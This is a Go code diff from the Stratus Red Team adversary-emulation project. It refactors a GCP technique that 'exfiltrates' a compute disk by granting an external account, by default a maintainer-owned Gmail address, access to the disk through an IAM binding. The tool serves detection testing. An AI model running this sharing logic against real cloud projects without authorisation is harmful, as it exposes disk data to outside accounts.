@@ -5,11 +5,10 @@ import (
 	"context"
 	computepb "google.golang.org/genproto/googleapis/cloud/compute/v1"
 	"log"
-	"os"
-	"strings"
 
 	_ "embed"
 	"fmt"
+	gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
 	"github.com/datadog/stratus-red-team/v2/internal/providers"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
@@ -18,8 +17,10 @@ import (
 //go:embed main.tf
 var tf []byte
 
+const codeBlock = "```"
+const AttackTechniqueId = "gcp.exfiltration.share-compute-disk"
+
 func init() {
-	const codeBlock = "```"
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
 		ID:           "gcp.exfiltration.share-compute-disk",
 		FriendlyName: "Exfiltrate Compute Disk by sharing it",
@@ -36,12 +37,12 @@ Detonation:
 
 !!! note
 
-	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + DefaultFictitiousAttackerEmail + ` by default.
+	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + gcp_utils.DefaultFictitiousAttackerEmail + ` by default.
 	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
-	this behavior by setting the environment variable <code>` + AttackerEmailEnvVarKey + `</code>, for instance:
+	this behavior by setting the environment variable <code>` + gcp_utils.AttackerEmailEnvVarKey + `</code>, for instance:
 
 	` + codeBlock + `bash
-	export ` + AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
+	export ` + gcp_utils.AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
 	stratus detonate ` + AttackTechniqueId + `
 	` + codeBlock + `
 `,
@@ -138,21 +139,18 @@ NOT protoPayload.authenticationInfo.principalEmail=~".+@your-domain.tld$"
 	})
 }
 
-const DefaultFictitiousAttackerEmail = "stratusredteam@gmail.com"
-const AttackerEmailEnvVarKey = "STRATUS_RED_TEAM_ATTACKER_EMAIL"
-
 func detonate(params map[string]string, providers stratus.CloudProviders) error {
 	gcp := providers.GCP()
 	diskName := params["disk_name"]
 	zone := params["zone"]
-	attackerEmail := getAttackerEmail()
+	attackerPrincipal := gcp_utils.GetAttackerPrincipal()
 
 	log.Println("Exfiltrating " + diskName + " by sharing it with a fictitious attacker")
-	err := shareDisk(gcp, diskName, zone, attackerEmail)
+	err := shareDisk(gcp, diskName, zone, attackerPrincipal)
 	if err != nil {
 		return fmt.Errorf("failed to share disk: %w", err)
 	}
-	log.Println("Successfully shared disk with a fictitious attacker account " + attackerEmail)
+	log.Println("Successfully shared disk with a fictitious attacker account " + attackerPrincipal)
 	return nil
 }
 
@@ -170,7 +168,7 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	return nil
 }
 
-func shareDisk(gcp *providers.GCPProvider, diskName string, zone string, targetUser string) error {
+func shareDisk(gcp *providers.GCPProvider, diskName string, zone string, targetPrincipal string) error {
 	diskClient, err := compute.NewDisksRESTClient(context.Background(), gcp.Options())
 	if err != nil {
 		return fmt.Errorf("unable to create compute client: %w", err)
@@ -186,7 +184,7 @@ func shareDisk(gcp *providers.GCPProvider, diskName string, zone string, targetU
 			Policy: &computepb.Policy{
 				Bindings: []*computepb.Binding{
 					{
-						Members: []string{"user:" + targetUser},
+						Members: []string{targetPrincipal},
 						Role:    &roleName,
 					},
 				},
@@ -221,10 +219,3 @@ func unshareDisk(gcp *providers.GCPProvider, diskName string, zone string) error
 	return nil
 }
 
-func getAttackerEmail() string {
-	if attackerEmail := os.Getenv(AttackerEmailEnvVarKey); attackerEmail != "" {
-		return strings.ToLower(attackerEmail)
-	} else {
-		return DefaultFictitiousAttackerEmail
-	}
-}
